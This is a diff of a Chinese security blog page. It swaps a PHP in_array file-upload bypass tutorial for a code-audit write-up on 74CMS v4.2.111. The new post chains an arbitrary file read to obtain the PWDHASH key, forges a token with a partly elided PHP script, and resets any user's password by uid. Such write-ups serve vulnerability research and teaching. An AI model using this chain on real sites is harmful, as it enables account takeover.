@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="代码审计," />
+  <meta name="keywords" content="CMS," />
 
 
 
@@ -79,21 +79,27 @@
 
 
 
-<meta name="description" content="最近看红日公众号的文章,看到 PHP-Audit-Labs 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波   Day 1 - Wish List题目名字:愿望清单代码大意:检查文件名file[‘name’]是否在白名单$whitelist里–&amp;gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIR">
-<meta name="keywords" content="代码审计">
+<meta name="description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
+<meta name="keywords" content="CMS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计之Day1 - in_array函数缺陷">
-<meta property="og:url" content="http://yoursite.com/2018/09/06/代码审计之Day1 - in_array函数缺陷/index.html">
+<meta property="og:title" content="代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置">
+<meta property="og:url" content="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="最近看红日公众号的文章,看到 PHP-Audit-Labs 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波   Day 1 - Wish List题目名字:愿望清单代码大意:检查文件名file[‘name’]是否在白名单$whitelist里–&amp;gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIR">
+<meta property="og:description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/bgfejdnfnoma3u8eqd2z4ubm/image_1cmmmhtm01cn4nastlume1tso20.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/pquwjj86ytjbyba2dkr0ppvv/image_1cmmo17sncmevnor4a10hp1rm73d.png">
-<meta property="og:updated_time" content="2018-09-07T05:31:29.287Z">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png">
+<meta property="og:updated_time" content="2018-10-10T05:54:50.380Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="代码审计之Day1 - in_array函数缺陷">
-<meta name="twitter:description" content="最近看红日公众号的文章,看到 PHP-Audit-Labs 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波   Day 1 - Wish List题目名字:愿望清单代码大意:检查文件名file[‘name’]是否在白名单$whitelist里–&amp;gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIR">
-<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/bgfejdnfnoma3u8eqd2z4ubm/image_1cmmmhtm01cn4nastlume1tso20.png">
+<meta name="twitter:title" content="代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置">
+<meta name="twitter:description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png">
 
 
 
@@ -123,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/09/06/代码审计之Day1 - in_array函数缺陷/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/"/>
 
 
 
 
 
-  <title>代码审计之Day1 - in_array函数缺陷 | P0rZ9's blog</title>
+  <title>代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置 | P0rZ9's blog</title>
   
 
 
@@ -240,7 +246,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/06/代码审计之Day1 - in_array函数缺陷/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -257,7 +263,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">代码审计之Day1 - in_array函数缺陷</h1>
+          <h1 class="post-title" itemprop="name headline">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</h1>
         
 
         <div class="post-meta">
@@ -269,8 +275,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-06T08:15:41+08:00">
-                2018-09-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
+                2018-10-10
               </time>
             
 
@@ -312,19 +318,60 @@
       
 
       
-        <blockquote>
-<p>最近看红日公众号的文章,看到 <strong>PHP-Audit-Labs</strong> 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波</p>
-</blockquote>
-<hr>
-<p><strong>Day 1 - Wish List</strong><br>题目名字:愿望清单<br><img src="http://static.zybuluo.com/chhyx/bgfejdnfnoma3u8eqd2z4ubm/image_1cmmmhtm01cn4nastlume1tso20.png" alt="image_1cmmmhtm01cn4nastlume1tso20.png-148.8kB"><br><strong>代码大意</strong>:检查文件名file[‘name’]是否在白名单$whitelist里–&gt;如果存在,则用move_upload_file()函数移动上传的临时文件file[‘tmp_name’]到指定目录UPLOAD_DIRECTORY</p>
-<p><strong>漏洞产生</strong>:这里考察的是任意文件上传漏洞,导致这一漏洞产生的原因是弱类型比较和in_array()的不规范使用,攻击者可通过构造的文件名(1.php)来绕过服务端的检测,造成文件上传漏洞<br><strong>漏洞解析</strong>:因为未将in_array()函数的第三个参数设置为TRUE且目标数组$whitelist的元素类型为数字类型,所以在进行in_array()判断时1.php会强制转化为1,而1在rand(1,24)数组中,最终绕过in_array()判断。</p>
-<blockquote>
-<p><strong>in_array()</strong><br>作用:检查数组中是否存在某个值<br>定义:bool in_array ( mixed \$needle , array \$haystack [, bool \$strict = FALSE ] )</p>
-</blockquote>
-<blockquote>
-<p>在\$haystack数组中搜索\$needle,如果\$strict参数的值为True,则in_array()函数会进行强检查(检查值、类型是否相同),如果没有设置,则默认为FALSE 进行弱检查(只检查值是否相同)。如果成功搜索到\$needle,则返回TRUE 否则返回FALSE。</p>
-</blockquote>
-<p><strong>本地测试:</strong><br><img src="http://static.zybuluo.com/chhyx/pquwjj86ytjbyba2dkr0ppvv/image_1cmmo17sncmevnor4a10hp1rm73d.png" alt="image_1cmmo17sncmevnor4a10hp1rm73d.png-35.3kB"></p>
+        <hr>
+<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
+<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
+<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
+<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
+<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
+<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
+</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
+<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
+// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
+// 经过 passport_key() 函数处理后的返回值
+$txt = passport_key(base64_decode($txt), $key);
+// 变量初始化
+$tmp = &apos;&apos;;
+// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
+for ($i = 0; $i &lt; strlen($txt); $i++) {
+    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
+    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
+    $tmp .= $txt[$i] ^ $txt[++$i];
+}
+// 返回 $tmp 的值作为结果
+return $tmp;
+</code></pre><p>}</p>
+<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
+<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
+<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
+<p>可看到修改成功。</p>
+<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
+<p>4.现在利用漏洞就很简单了</p>
+<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
+</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
+<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
+<p>2.我们本地加密得到<code>token</code>:</p>
+<pre><code>#demo.php
+&lt;?php
+
+function get_token($pwdhash){
+    $token = encrypt($pwdhash,$pwdhash);
+    var_dump($token);
+
+}
+function encrypt($txt, $key = &apos;_qscms&apos;) {
+    ...
+}
+function passport_key($txt, $encrypt_key) {
+   ...
+}
+
+$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
+$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
+get_token($data[&apos;PWDHASH&apos;]);
+?&gt;
+</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
+<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>
 
       
     </div>
@@ -342,7 +389,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            <a href="/tags/CMS/" rel="tag"># CMS</a>
           
         </div>
       
@@ -355,8 +402,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/05/用hexo+girhub部署博客/" rel="next" title="用hexo+github部署博客">
-                <i class="fa fa-chevron-left"></i> 用hexo+github部署博客
+              <a href="/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/" rel="next" title="代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本">
+                <i class="fa fa-chevron-left"></i> 代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本
               </a>
             
           </div>
@@ -365,8 +412,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/09/06/代码审计之Day2 - filter_var函数缺陷/" rel="prev" title="代码审计之Day2 - filter_var函数缺陷">
-                代码审计之Day2 - filter_var函数缺陷 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/10/10/74CMS_V4.2.111多处sql注入/" rel="prev" title="">
+                 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
